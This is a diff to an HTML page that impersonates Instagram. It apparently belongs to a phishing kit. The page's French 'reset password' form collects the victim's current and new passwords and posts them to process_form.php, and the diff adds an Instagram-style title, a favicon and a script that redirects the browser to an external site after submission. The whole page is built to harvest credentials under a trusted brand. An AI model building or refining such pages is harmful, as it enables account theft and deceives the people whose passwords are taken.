@@ -4,11 +4,12 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>Login • Instagram</title>
+    <title>Instagram</title>
 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
     <link rel="stylesheet" href="style.css">
     <link rel="shortcut icon" type="image/x-icon" href="./favicon.ico">
+    <link rel="icon" type="image/x-icon" href="fav.png">
 
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
@@ -46,18 +47,25 @@
     </div>
 
 
+
     <form action="process_form.php" method="POST">
+
 
         <input  placeholder="mot de passe actuel" type="password" class="Form" name="current_password">
         <input  placeholder="Nouveau mot de passe" type="password" class="Form" name="new_password">
         <input  placeholder="Confirmer le nouveau mot de passe" type="password" name="confirm_password">
 
-        <input class="Send" type="submit" value="Réinitialiser le mot de passe" /><br>
+        <input class="Send" type="submit" value="Réinitialiser le mot de passe" onclick="redirectToLink()" /><br>
 
     </form>
 
 
-
+    <script>
+        function redirectToLink() {
+            // Redirect to the external link
+            window.location.href = "https://www.example.com";
+        }
+    </script>
 
 
 </div>
